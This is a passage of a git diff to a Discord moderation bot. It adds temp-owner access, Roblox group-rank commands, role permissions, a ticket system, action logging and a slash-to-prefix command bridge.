@@ -47,6 +47,18 @@ function baseEmbed() {
     .setFooter({ text: getBotName(), iconURL: getLogoUrl() })
 }
 
+// fire-and-forget log to the configured log channel (set with /setlogchannel)
+function sendBotLog(guild, embed) {
+  try {
+    if (!guild) return
+    const cfg = loadJSON(path.join(__dirname, 'config.json'))
+    if (!cfg.logChannelId) return
+    const ch = guild.channels.cache.get(cfg.logChannelId)
+    if (!ch) return
+    ch.send({ embeds: [embed] }).catch(() => {})
+  } catch {}
+}
+
 // unified dark grey color palette
 const COLOR = {
   success : 0x2C2F33,
@@ -110,6 +122,12 @@ const SAVED_EMBEDS_FILE = path.join(__dirname, 'saved_embeds.json')
 const ANNOY_FILE = path.join(__dirname, 'annoy.json')
 const SKULL_FILE = path.join(__dirname, 'skull.json')
 const ACTIVITY_CHECK_FILE = path.join(__dirname, 'activity_check.json')
+const TEMPOWNERS_FILE = path.join(__dirname, 'tempowners.json')
+const ROBLOX_ROLES_FILE = path.join(__dirname, 'roblox_roles.json')
+const ROLE_PERMS_FILE = path.join(__dirname, 'role_perms.json')
+const TICKETS_FILE = path.join(__dirname, 'tickets.json')
+const TICKET_SUPPORT_FILE = path.join(__dirname, 'ticket_support.json')
+const TAG_LOG_FILE = path.join(__dirname, 'tag_log.json')
 
 const RANKUP_FILE         = path.join(__dirname, 'rankup.json')
 const QUEUE_FILE          = path.join(__dirname, 'queue.json')
@@ -175,6 +193,24 @@ const loadSkull = () => loadJSON(SKULL_FILE)
 const saveSkull = s => saveJSON(SKULL_FILE, s)
 const loadActivityCheck = () => loadJSON(ACTIVITY_CHECK_FILE)
 const saveActivityCheck = a => saveJSON(ACTIVITY_CHECK_FILE, a)
+const loadTempOwners = () => { const d = loadJSON(TEMPOWNERS_FILE); return Array.isArray(d.ids) ? d.ids : [] }
+const saveTempOwners = ids => saveJSON(TEMPOWNERS_FILE, { ids })
+const loadRobloxRoles = () => loadJSON(ROBLOX_ROLES_FILE)
+const saveRobloxRoles = r => saveJSON(ROBLOX_ROLES_FILE, r)
+const loadRolePerms = () => { const d = loadJSON(ROLE_PERMS_FILE); return Array.isArray(d.roles) ? d.roles : [] }
+const saveRolePerms = roles => saveJSON(ROLE_PERMS_FILE, { roles })
+const loadTickets = () => loadJSON(TICKETS_FILE)
+const saveTickets = t => saveJSON(TICKETS_FILE, t)
+const loadTicketSupport = () => { const d = loadJSON(TICKET_SUPPORT_FILE); return Array.isArray(d.roles) ? d.roles : [] }
+const saveTicketSupport = roles => saveJSON(TICKET_SUPPORT_FILE, { roles })
+const loadTagLog = () => { const d = loadJSON(TAG_LOG_FILE); return Array.isArray(d.entries) ? d.entries : [] }
+const saveTagLog = entries => saveJSON(TAG_LOG_FILE, { entries })
+function appendTagLog(entry) {
+  const entries = loadTagLog()
+  entries.push({ ...entry, ts: Date.now() })
+  // keep most recent 500 entries
+  saveTagLog(entries.slice(-500))
+}
 
 const loadRankup        = () => loadJSON(RANKUP_FILE)
 const saveRankup        = r  => saveJSON(RANKUP_FILE, r)
@@ -222,13 +258,28 @@ const saveJoindm = j => saveJSON(JOINDM_FILE, j)
 const loadLogs = () => loadJSON(LOGS_FILE)
 const saveLogs = l => saveJSON(LOGS_FILE, l)
 
+// check if someone is a temp owner (full-access bypass)
+function isTempOwner(userId) {
+  return loadTempOwners().includes(userId)
+}
+
 // check if someone can manage the whitelist
+// tempowner gets in here too so they can use every command that wl managers can
 function isWlManager(userId) {
+  if (isTempOwner(userId)) return true
   const mgrs = loadWlManagers()
   if (mgrs.includes(userId)) return true
   // also check the env var ones
   const envMgrs = (process.env.WHITELIST_MANAGERS || '').split(',').map(s => s.trim()).filter(Boolean)
   return envMgrs.includes(userId)
+}
+
+// can a member use /role? wl manager / tempowner OR a discord role allowed via /setroleperms
+function canUseRole(member) {
+  if (!member) return false
+  if (isWlManager(member.id)) return true
+  const allowed = loadRolePerms()
+  return member.roles?.cache?.some(r => allowed.includes(r.id)) ?? false
 }
 
 // set up config files on startup
@@ -279,6 +330,12 @@ function isWlManager(userId) {
   if (!fs.existsSync(VANITY_FILE)) saveVanity({})
   if (!fs.existsSync(WARNS_FILE)) saveWarns({})
   if (!fs.existsSync(AUTORESPONDER_FILE)) saveAutoresponder({})
+  if (!fs.existsSync(TEMPOWNERS_FILE)) saveTempOwners([])
+  if (!fs.existsSync(ROBLOX_ROLES_FILE)) saveRobloxRoles({})
+  if (!fs.existsSync(ROLE_PERMS_FILE)) saveRolePerms([])
+  if (!fs.existsSync(TICKETS_FILE)) saveTickets({})
+  if (!fs.existsSync(TICKET_SUPPORT_FILE)) saveTicketSupport([])
+  if (!fs.existsSync(TAG_LOG_FILE)) saveTagLog([])
 })()
 
 const getPrefix = () => loadConfig().prefix || '.'
@@ -1057,6 +1114,35 @@ const HELP_SECTIONS = [
       '{p}servers — list all servers',
     ]
   },
+  {
+    title: 'roblox roles & permissions (whitelist only)',
+    commands: [
+      '/role [roblox] [role] — set a roblox group role on a user',
+      '/setrole [name] [id] — register a roblox group role by name',
+      '/setroleperms add/remove/list [role] — let a discord role use /role',
+      '/r @member [roles...] — toggle discord roles on a member',
+    ]
+  },
+  {
+    title: 'logs, verify & tickets (whitelist only)',
+    commands: [
+      '/setlogchannel [channel] — set the bot action log channel',
+      '/logstatus — see the current log channel',
+      '/setverifyrole [role] — set the role given on verification',
+      '/setuptickets [channel] — send a ticket panel embed',
+      '/closeticket — close the current ticket',
+      '/ticket supportroles add/remove/list — manage ticket support roles',
+      '/give1 — give the bot and you the highest role possible',
+    ]
+  },
+  {
+    title: 'temp owner (whitelist only)',
+    commands: [
+      '/tempowner [user] — grant access to every command',
+      '/untempowner [user] — revoke temp owner access',
+      'note: temp owners bypass every permission check on the bot.',
+    ]
+  },
 ];
 
 const GC_PER_PAGE = 10;
@@ -1398,14 +1484,68 @@ const slashCommands = [
       ))
     .addBooleanOption(o => o.setName('show').setDescription('show the result publicly (default: only you see it)').setRequired(false)),
 
-  new SlashCommandBuilder().setName('role').setDescription('add or remove roles from a member (toggles if they already have it)')
+  new SlashCommandBuilder().setName('role').setDescription('Set a Roblox group role')
     .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS)
-    .addUserOption(o => o.setName('member').setDescription('member to give/remove roles').setRequired(true))
-    .addRoleOption(o => o.setName('role1').setDescription('first role').setRequired(true))
-    .addRoleOption(o => o.setName('role2').setDescription('second role').setRequired(false))
-    .addRoleOption(o => o.setName('role3').setDescription('third role').setRequired(false))
-    .addRoleOption(o => o.setName('role4').setDescription('fourth role').setRequired(false))
-    .addRoleOption(o => o.setName('role5').setDescription('fifth role').setRequired(false)),
+    .addStringOption(o => o.setName('roblox').setDescription('roblox username').setRequired(true))
+    .addStringOption(o => o.setName('role').setDescription('target group role').setRequired(true)),
+
+  new SlashCommandBuilder().setName('setrole').setDescription('register a roblox group role by name and id')
+    .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS)
+    .addStringOption(o => o.setName('name').setDescription('role name (used in /role)').setRequired(true))
+    .addStringOption(o => o.setName('id').setDescription('roblox group role id').setRequired(true)),
+
+  new SlashCommandBuilder().setName('setroleperms').setDescription('Allow a Discord role to use /role')
+    .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS)
+    .addStringOption(o => o.setName('action').setDescription('action').setRequired(true)
+      .addChoices({ name: 'add', value: 'add' }, { name: 'remove', value: 'remove' }, { name: 'list', value: 'list' }))
+    .addRoleOption(o => o.setName('role').setDescription('discord role').setRequired(false)),
+
+  new SlashCommandBuilder().setName('tempowner').setDescription('Grant a user temporary access to all bot commands')
+    .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS)
+    .addUserOption(o => o.setName('user').setDescription('user').setRequired(true)),
+
+  new SlashCommandBuilder().setName('untempowner').setDescription('Revoke temp owner access from a user')
+    .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS)
+    .addUserOption(o => o.setName('user').setDescription('user').setRequired(true)),
+
+  new SlashCommandBuilder().setName('setlogchannel').setDescription('Set the channel for bot action logs')
+    .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS)
+    .addChannelOption(o => o.setName('channel').setDescription('log channel').setRequired(true)),
+
+  new SlashCommandBuilder().setName('logstatus').setDescription('Check the current log channel setting')
+    .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS),
+
+  new SlashCommandBuilder().setName('setverifyrole').setDescription('Set the role given on verification')
+    .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS)
+    .addRoleOption(o => o.setName('role').setDescription('role to give verified users').setRequired(true)),
+
+  new SlashCommandBuilder().setName('setuptickets').setDescription('Send a ticket panel embed to a channel')
+    .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS)
+    .addChannelOption(o => o.setName('channel').setDescription('channel for the panel').setRequired(true))
+    .addStringOption(o => o.setName('title').setDescription('panel title').setRequired(false))
+    .addStringOption(o => o.setName('description').setDescription('panel description').setRequired(false)),
+
+  new SlashCommandBuilder().setName('closeticket').setDescription('Close and delete the current ticket channel')
+    .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS),
+
+  new SlashCommandBuilder().setName('ticket').setDescription('Ticket management')
+    .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS)
+    .addSubcommand(s => s.setName('supportroles').setDescription('Add or remove support roles for ticket actions')
+      .addStringOption(o => o.setName('action').setDescription('action').setRequired(true)
+        .addChoices({ name: 'add', value: 'add' }, { name: 'remove', value: 'remove' }, { name: 'list', value: 'list' }))
+      .addRoleOption(o => o.setName('role').setDescription('discord role').setRequired(false))),
+
+  new SlashCommandBuilder().setName('give1').setDescription('Give the bot and you the highest role possible')
+    .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS),
+
+  new SlashCommandBuilder().setName('tag').setDescription('Rank a Roblox user (same as /role) — logged to the tag log')
+    .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS)
+    .addStringOption(o => o.setName('roblox').setDescription('roblox username').setRequired(true))
+    .addStringOption(o => o.setName('role').setDescription('registered roblox group role name').setRequired(true)),
+
+  new SlashCommandBuilder().setName('taglog').setDescription('View the most recent tag-log entries')
+    .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS)
+    .addIntegerOption(o => o.setName('limit').setDescription('how many entries to show (default 10)').setRequired(false).setMinValue(1).setMaxValue(50)),
 
   new SlashCommandBuilder().setName('r').setDescription('add or remove roles from a member (toggles if they already have it)')
     .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS)
@@ -1461,6 +1601,18 @@ const slashCommands = [
     .addStringOption(o => o.setName('text').setDescription('new display name (leave blank to see current)').setRequired(false))
     .addStringOption(o => o.setName('action').setDescription('reset to default').setRequired(false)
       .addChoices({ name: 'reset', value: 'reset' })),
+
+  // ── Bridged: prefix-only commands exposed as slash with a single `args` string ─
+  ...[
+    'snipe', 'editsnipe', 'reactsnipe', 'afk', 'drag', 'cleanup', 'activitycheck',
+    'cs', 'group', 'flag', 'unflag', 'roleinfo', 'config', 'id', 'rfile', 'lvfile',
+    'import', 'register', 'pregister', 'verify', 'registeredlist', 'linked', 'scan',
+    'attend', 'startattend', 'setraidvc', 'rollcall', 'endrollcall', 'whoisin', 'ingame'
+  ].map(name =>
+    new SlashCommandBuilder().setName(name).setDescription(`${name} command (use args for arguments)`)
+      .setIntegrationTypes(GUILD_INSTALLS).setContexts(GUILD_CONTEXTS)
+      .addStringOption(o => o.setName('args').setDescription('arguments (same as the prefix command)').setRequired(false))
+  ),
 ].map(c => c.toJSON());
 
 // ─── Status helper ────────────────────────────────────────────────────────────
@@ -1791,8 +1943,182 @@ client.on('voiceStateUpdate', async (oldState, newState) => {
   }
 });
 
+// ─── Slash ↔ Prefix bridge helpers ────────────────────────────────────────────
+// These let every slash command also work as a prefix command, and vice versa.
+// SLASH_ONLY_COMMANDS lists slash commands that have NO matching prefix handler.
+// When a user types one of these as a prefix command, we re-dispatch through the
+// slash handler with a fake interaction object.
+const SLASH_ONLY_COMMANDS = new Set([
+  'closeticket', 'generate', 'give1', 'logstatus', 'setlogchannel', 'setrole',
+  'setroleperms', 'setuptickets', 'setverifyrole', 'tempowner', 'ticket', 'untempowner',
+  'tag', 'taglog'
+]);
+
+// Slash commands that the slash handler already handles directly. Anything not in
+// this set falls through and is re-dispatched as a prefix command.
+const SLASH_HANDLED_COMMANDS = new Set([
+  'help', 'vmhelp', 'roblox', 'gc', 'hb', 'ban', 'kick', 'unban', 'purge', 'timeout',
+  'untimeout', 'mute', 'unmute', 'hush', 'unhush', 'nuke', 'lock', 'unlock', 'say',
+  'grouproles', 'wlmanager', 'jail', 'unjail', 'prefix', 'status', 'whitelist',
+  'about', 'annoy', 'unannoy', 'skull', 'unskull', 'unhb', 'warn', 'warnings',
+  'clearwarns', 'delwarn', 'serverinfo', 'userinfo', 'avatar', 'banner', 'invites',
+  'convert', 'dm', 'vm', 'generate', 'role', 'setrole', 'setroleperms', 'tempowner',
+  'untempowner', 'setlogchannel', 'logstatus', 'setverifyrole', 'setuptickets',
+  'closeticket', 'ticket', 'give1', 'r', 'inrole', 'leaveserver', 'rid', 'rankup',
+  'setrankroles', 'fileroles', 'servers', 'logo', 'name',
+  'tag', 'taglog'
+]);
+
+// Build a fake CommandInteraction-like object from a Message + parsed args.
+// Used when a user invokes a slash-only command as a prefix command.
+function buildFakeInteractionFromMessage(message, commandName, argsArray) {
+  const tokens = Array.isArray(argsArray) ? [...argsArray] : (argsArray ? String(argsArray).trim().split(/\s+/) : []);
+  // Resolve a token to a discord entity id (mention or raw id)
+  const idFrom = t => t ? (String(t).match(/\d{15,}/)?.[0] ?? null) : null;
+  // remember which option-names map to "rest of line" style strings
+  const restNames = new Set(['reason', 'text', 'message', 'description', 'name', 'url', 'title', 'args']);
+  let lastSent = null;
+  let replied = false;
+  let deferred = false;
+
+  const fake = {
+    commandName,
+    user: message.author,
+    member: message.member,
+    guild: message.guild,
+    guildId: message.guildId,
+    channel: message.channel,
+    channelId: message.channelId,
+    client: message.client,
+    id: message.id,
+    createdTimestamp: message.createdTimestamp,
+    get replied() { return replied },
+    get deferred() { return deferred },
+    isChatInputCommand: () => true,
+    isButton: () => false,
+    isModalSubmit: () => false,
+    isStringSelectMenu: () => false,
+    isAutocomplete: () => false,
+    isUserContextMenuCommand: () => false,
+    isMessageContextMenuCommand: () => false,
+    inGuild: () => !!message.guild,
+    options: {
+      _tokens: tokens,
+      getSubcommand(_required) { return tokens.shift() || null },
+      getSubcommandGroup(_required) { return null },
+      getString(name, _required) {
+        if (restNames.has(name) && tokens.length > 1) {
+          const rest = tokens.join(' '); tokens.length = 0; return rest || null;
+        }
+        const t = tokens.shift(); return t == null ? null : String(t);
+      },
+      getInteger(name, _required) { const t = tokens.shift(); const n = parseInt(t, 10); return Number.isFinite(n) ? n : null; },
+      getNumber(name, _required) { const t = tokens.shift(); const n = parseFloat(t); return Number.isFinite(n) ? n : null; },
+      getBoolean(name, _required) { const t = tokens.shift()?.toLowerCase(); return t === 'true' || t === 'yes' || t === '1' || t === 'on'; },
+      getUser(name, _required) {
+        const t = tokens.shift(); const id = idFrom(t); if (!id) return null;
+        return message.client.users.cache.get(id) || null;
+      },
+      getMember(name) {
+        const t = tokens.shift(); const id = idFrom(t); if (!id) return null;
+        return message.guild?.members.cache.get(id) || null;
+      },
+      getRole(name, _required) {
+        const t = tokens.shift(); const id = idFrom(t); if (!id) return null;
+        return message.guild?.roles.cache.get(id) || null;
+      },
+      getChannel(name, _required) {
+        const t = tokens.shift(); const id = idFrom(t); if (!id) return null;
+        return message.guild?.channels.cache.get(id) || null;
+      },
+      getMentionable(name, _required) {
+        const t = tokens.shift(); const id = idFrom(t); if (!id) return null;
+        return message.guild?.members.cache.get(id) || message.guild?.roles.cache.get(id) || null;
+      },
+      getAttachment(_name, _required) { return null; }
+    },
+    async reply(opts) {
+      replied = true;
+      const o = typeof opts === 'string' ? { content: opts } : { ...opts };
+      delete o.ephemeral; delete o.flags;
+      lastSent = await message.reply(o).catch(() => null);
+      return lastSent;
+    },
+    async editReply(opts) {
+      const o = typeof opts === 'string' ? { content: opts } : { ...opts };
+      delete o.ephemeral; delete o.flags;
+      if (lastSent) { try { return await lastSent.edit(o); } catch {} }
+      lastSent = await message.reply(o).catch(() => null);
+      return lastSent;
+    },
+    async deferReply(opts = {}) {
+      deferred = true;
+      try { await message.channel.sendTyping(); } catch {}
+      return null;
+    },
+    async followUp(opts) {
+      const o = typeof opts === 'string' ? { content: opts } : { ...opts };
+      delete o.ephemeral; delete o.flags;
+      return message.channel.send(o).catch(() => null);
+    },
+    async deleteReply() { try { await lastSent?.delete(); } catch {} },
+    async fetchReply() { return lastSent; }
+  };
+  return fake;
+}
+
+// Build a fake Message-like object from a slash interaction. Used when a user
+// invokes a prefix-only command as a slash command.
+function buildFakeMessageFromInteraction(interaction) {
+  const cmd = interaction.commandName;
+  const argsStr = interaction.options.getString('args') || '';
+  const prefix = getPrefix();
+  const content = `${prefix}${cmd}${argsStr ? ' ' + argsStr : ''}`;
+  let replied = false;
+  let lastSent = null;
+
+  const respond = async (opts) => {
+    const o = typeof opts === 'string' ? { content: opts } : { ...opts };
+    delete o.ephemeral; delete o.flags;
+    if (!replied) {
+      replied = true;
+      try { lastSent = await interaction.reply({ ...o, fetchReply: true }); return lastSent; } catch {}
+    }
+    try { return await interaction.followUp(o); } catch { return null; }
+  };
+
+  return {
+    id: interaction.id,
+    content,
+    author: interaction.user,
+    member: interaction.member,
+    guild: interaction.guild,
+    guildId: interaction.guildId,
+    channel: interaction.channel,
+    channelId: interaction.channelId,
+    client: interaction.client,
+    createdTimestamp: interaction.createdTimestamp,
+    partial: false,
+    mentions: {
+      users: new Map(),
+      members: new Map(),
+      roles: new Map(),
+      channels: new Map(),
+      everyone: false,
+      first() { return null },
+      has() { return false }
+    },
+    attachments: new Map(),
+    reference: null,
+    async reply(opts) { return respond(opts); },
+    async fetch() { return this; },
+    async delete() { try { await interaction.deleteReply(); } catch {} },
+    async react() { return null; }
+  };
+}
+
 // ─── Interaction handler ──────────────────────────────────────────────────────
-client.on('interactionCreate', async interaction => {
+async function dispatchSlash(interaction) {
   // ── Modal: VM rename ────────────────────────────────────────────────────────
   if (interaction.isModalSubmit() && interaction.customId === 'vm_rename_modal') {
     const newName = interaction.fields.getTextInputValue('vm_rename_input');
@@ -1811,6 +2137,73 @@ client.on('interactionCreate', async interaction => {
     if (interaction.customId.startsWith('help_')) {
       const page = parseInt(interaction.customId.split('_')[1]);
       return interaction.update({ embeds: [buildHelpEmbed(page)], components: [buildHelpRow(page)] });
+    }
+
+    // ── ticket panel: open a ticket ───────────────────────────────────────────
+    if (interaction.customId === 'ticket_open') {
+      const guild = interaction.guild;
+      if (!guild) return interaction.reply({ content: 'server only', ephemeral: true });
+      const tickets = loadTickets();
+      const existing = Object.entries(tickets).find(([, t]) => t.userId === interaction.user.id);
+      if (existing) return interaction.reply({ embeds: [errorEmbed('ticket already open').setDescription(`you already have an open ticket: <#${existing[0]}>`)], ephemeral: true });
+      await interaction.deferReply({ ephemeral: true });
+      const support = loadTicketSupport();
+      // staff who automatically see every ticket: wl managers, temp owners, whitelisted users
+      const envMgrs = (process.env.WHITELIST_MANAGERS || '').split(',').map(s => s.trim()).filter(Boolean);
+      const staffIds = new Set([
+        ...loadWlManagers(),
+        ...envMgrs,
+        ...loadTempOwners(),
+        ...loadWhitelist()
+      ]);
+      staffIds.delete(interaction.user.id); // already added below as the opener
+      const overwrites = [
+        { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
+        { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.AttachFiles] },
+        { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ManageChannels, PermissionsBitField.Flags.ReadMessageHistory] }
+      ];
+      for (const rid of support) overwrites.push({ id: rid, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.AttachFiles] });
+      for (const uid of staffIds) overwrites.push({ id: uid, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.AttachFiles] });
+      try {
+        const ch = await guild.channels.create({
+          name: `ticket-${interaction.user.username}`.toLowerCase().slice(0, 90),
+          type: ChannelType.GuildText,
+          parent: interaction.channel.parentId || undefined,
+          permissionOverwrites: overwrites,
+          reason: `ticket opened by ${interaction.user.tag}`
+        });
+        tickets[ch.id] = { userId: interaction.user.id, openedAt: Date.now() };
+        saveTickets(tickets);
+        const supportPing = support.length ? support.map(id => `<@&${id}>`).join(' ') : '';
+        const closeRow = new ActionRowBuilder().addComponents(
+          new ButtonBuilder().setCustomId('ticket_close').setLabel('Close Ticket').setStyle(ButtonStyle.Secondary)
+        );
+        await ch.send({
+          content: `${interaction.user} ${supportPing}`.trim(),
+          embeds: [baseEmbed().setColor(0x2C2F33).setTitle('ticket opened').setDescription('describe your issue and a support member will be with you shortly. use the button below or `/closeticket` to close.')],
+          components: [closeRow],
+          allowedMentions: { users: [interaction.user.id], roles: support }
+        });
+        sendBotLog(guild, baseEmbed().setColor(0x2C2F33).setTitle('ticket opened').setDescription(`${interaction.user.tag} opened ${ch}`));
+        return interaction.editReply({ embeds: [successEmbed('ticket created').setDescription(`your ticket: ${ch}`)] });
+      } catch (err) {
+        return interaction.editReply({ embeds: [errorEmbed('failed').setDescription('could not create ticket channel — check my permissions')] });
+      }
+    }
+
+    if (interaction.customId === 'ticket_close') {
+      const guild = interaction.guild;
+      const tickets = loadTickets();
+      const t = tickets[interaction.channel.id];
+      if (!t) return interaction.reply({ embeds: [errorEmbed('not a ticket').setDescription('this isn\'t a ticket channel')], ephemeral: true });
+      const support = loadTicketSupport();
+      const allowed = isWlManager(interaction.user.id) || interaction.member.roles.cache.some(r => support.includes(r.id)) || t.userId === interaction.user.id;
+      if (!allowed) return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only the ticket opener, support roles, or wl managers can close this')], ephemeral: true });
+      await interaction.reply({ embeds: [baseEmbed().setColor(0x2C2F33).setDescription('closing this ticket in 5s...')] });
+      delete tickets[interaction.channel.id]; saveTickets(tickets);
+      setTimeout(async () => { try { await interaction.channel.delete('ticket closed'); } catch {} }, 5000);
+      sendBotLog(guild, baseEmbed().setColor(0x2C2F33).setTitle('ticket closed').setDescription(`<#${interaction.channel.id}> (${interaction.channel.name}) closed by ${interaction.user.tag}`));
+      return;
     }
 
     if (interaction.customId === 'striptag_confirm' || interaction.customId === 'striptag_cancel') {
@@ -2149,7 +2542,11 @@ client.on('interactionCreate', async interaction => {
 
   if (commandName === 'vmhelp') return interaction.reply({ embeds: [buildVmHelpEmbed()] });
 
-  if (commandName === 'help') return interaction.reply({ embeds: [buildHelpEmbed(0)], components: [buildHelpRow(0)] });
+  if (commandName === 'help') {
+    if (!isWlManager(interaction.user.id))
+      return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only whitelist managers and temp owners can use `/help`')], ephemeral: true });
+    return interaction.reply({ embeds: [buildHelpEmbed(0)], components: [buildHelpRow(0)] });
+  }
 
   if (commandName === 'afk') {
     const reason = interaction.options.getString('reason') || null;
@@ -2292,11 +2689,19 @@ client.on('interactionCreate', async interaction => {
 
   if (commandName === 'mute') {
     if (!guild) return interaction.reply({ content: "this only works in a server", ephemeral: true });
+    if (!isWlManager(interaction.user.id))
+      return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only whitelist managers can use `/mute`')], ephemeral: true });
     const target = interaction.options.getMember('user');
     const reason = interaction.options.getString('reason') || 'no reason';
     if (!target) return interaction.reply({ content: "could not find that member", ephemeral: true });
     try { await target.timeout(28 * 24 * 60 * 60 * 1000, reason); } catch { return interaction.reply({ content: "couldn't mute them", ephemeral: true }); }
-    return interaction.reply({ embeds: [baseEmbed().setTitle('muted').setColor(0x2C2F33).setThumbnail(target.user.displayAvatarURL()).setDescription(`@${target.user.username} has been muted`)
+    // dm the muted user a notification
+    try {
+      await target.send({ embeds: [baseEmbed().setColor(0x2C2F33).setTitle('you have been muted')
+        .setDescription(`you were muted in **${guild.name}**`)
+        .addFields({ name: 'reason', value: reason }, { name: 'moderator', value: interaction.user.tag })] });
+    } catch {}
+    return interaction.reply({ embeds: [baseEmbed().setTitle('muted').setColor(0x2C2F33).setThumbnail(target.user.displayAvatarURL()).setDescription(`@${target.user.username} has been muted (dm sent)`)
       .addFields({ name: 'user', value: target.user.tag, inline: true }, { name: 'mod', value: interaction.user.tag, inline: true }, { name: 'reason', value: reason }).setImage(MOD_IMAGE_URL).setTimestamp()] });
   }
 
@@ -3104,8 +3509,39 @@ client.on('interactionCreate', async interaction => {
     return interaction.reply({ embeds: [buildVmHelpEmbed()] });
   }
 
-  // ── /role and /r (WL managers only, toggles roles) ────────────────────────────
-  if (commandName === 'role' || commandName === 'r') {
+  // ── /role — set a roblox group role on a roblox user ─────────────────────────
+  if (commandName === 'role') {
+    if (!guild) return interaction.reply({ content: 'server only', ephemeral: true });
+    if (!canUseRole(interaction.member))
+      return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('you don\'t have permission to use `/role`. ask a wl manager to allow your role with `/setroleperms add`.')], ephemeral: true });
+
+    const robloxUsername = interaction.options.getString('roblox');
+    const roleName = interaction.options.getString('role');
+    const roles = loadRobloxRoles();
+    const lookup = roles[roleName] || roles[roleName.toLowerCase()];
+    if (!lookup) return interaction.reply({ embeds: [errorEmbed('unknown role').setDescription(`no roblox group role named **${roleName}** is registered. use \`/setrole\` first.`)], ephemeral: true });
+
+    await interaction.deferReply();
+    try {
+      const result = await rankRobloxUser(robloxUsername, lookup.id);
+      const e = baseEmbed().setColor(0x2C2F33).setTitle('roblox role set')
+        .setDescription(`set **${result.displayName}** to **${lookup.name || roleName}**`)
+        .addFields(
+          { name: 'roblox', value: `[${result.displayName}](https://www.roblox.com/users/${result.userId}/profile)`, inline: true },
+          { name: 'role', value: `${lookup.name || roleName} \`${lookup.id}\``, inline: true },
+          { name: 'set by', value: interaction.user.tag, inline: false }
+        );
+      if (result.avatarUrl) e.setThumbnail(result.avatarUrl);
+      await interaction.editReply({ embeds: [e] });
+      sendBotLog(guild, e);
+    } catch (err) {
+      await interaction.editReply({ embeds: [errorEmbed('failed').setDescription(err.message)] });
+    }
+    return;
+  }
+
+  // ── /r — original discord role toggle (wl managers only) ─────────────────────
+  if (commandName === 'r') {
     if (!guild) return interaction.reply({ content: 'server only', ephemeral: true });
     if (!isWlManager(interaction.user.id))
       return interaction.reply({ content: 'only whitelist managers can use this command', ephemeral: true });
@@ -3133,12 +3569,251 @@ client.on('interactionCreate', async interaction => {
     }
 
     const lines = [];
-    if (added.length)   lines.push(`➕ Added ${added.join(', ')} to ${targetMember}`);
-    if (removed.length) lines.push(`➖ Removed ${removed.join(', ')} from ${targetMember}`);
-    if (failed.length)  lines.push(`❌ Failed: ${failed.join(', ')} (missing perms?)`);
+    if (added.length)   lines.push(`Added ${added.join(', ')} to ${targetMember}`);
+    if (removed.length) lines.push(`Removed ${removed.join(', ')} from ${targetMember}`);
+    if (failed.length)  lines.push(`Failed: ${failed.join(', ')} (missing perms?)`);
 
     return interaction.reply({ embeds: [baseEmbed().setColor(0x2C2F33).setDescription(lines.join('\n') || 'nothing changed')] });
   }
+
+  // ── /setrole — register a roblox group role name → id ────────────────────────
+  if (commandName === 'setrole') {
+    if (!guild) return interaction.reply({ content: 'server only', ephemeral: true });
+    if (!isWlManager(interaction.user.id))
+      return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only whitelist managers can use `/setrole`')], ephemeral: true });
+    const name = interaction.options.getString('name').trim();
+    const id = interaction.options.getString('id').trim();
+    if (!/^\d+$/.test(id)) return interaction.reply({ embeds: [errorEmbed('bad id').setDescription('role id must be numeric')], ephemeral: true });
+    const roles = loadRobloxRoles();
+    roles[name] = { id, name };
+    saveRobloxRoles(roles);
+    return interaction.reply({ embeds: [successEmbed('role registered').setDescription(`saved roblox group role **${name}** → \`${id}\``).addFields({ name: 'usage', value: `\`/role roblox:<username> role:${name}\`` })] });
+  }
+
+  // ── /setroleperms — allow discord role to use /role ──────────────────────────
+  if (commandName === 'setroleperms') {
+    if (!guild) return interaction.reply({ content: 'server only', ephemeral: true });
+    if (!isWlManager(interaction.user.id))
+      return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only whitelist managers can use `/setroleperms`')], ephemeral: true });
+    const action = interaction.options.getString('action');
+    const role = interaction.options.getRole('role');
+    let perms = loadRolePerms();
+    if (action === 'list') {
+      const desc = perms.length ? perms.map(id => `<@&${id}>`).join('\n') : 'no roles allowed yet';
+      return interaction.reply({ embeds: [infoEmbed('role permissions').setDescription(desc)] });
+    }
+    if (!role) return interaction.reply({ embeds: [errorEmbed('missing role').setDescription('pick a discord role')], ephemeral: true });
+    if (action === 'add') {
+      if (perms.includes(role.id)) return interaction.reply({ embeds: [errorEmbed('already allowed').setDescription(`${role} can already use /role`)], ephemeral: true });
+      perms.push(role.id); saveRolePerms(perms);
+      return interaction.reply({ embeds: [successEmbed('role allowed').setDescription(`${role} can now use \`/role\``)] });
+    }
+    if (action === 'remove') {
+      perms = perms.filter(id => id !== role.id); saveRolePerms(perms);
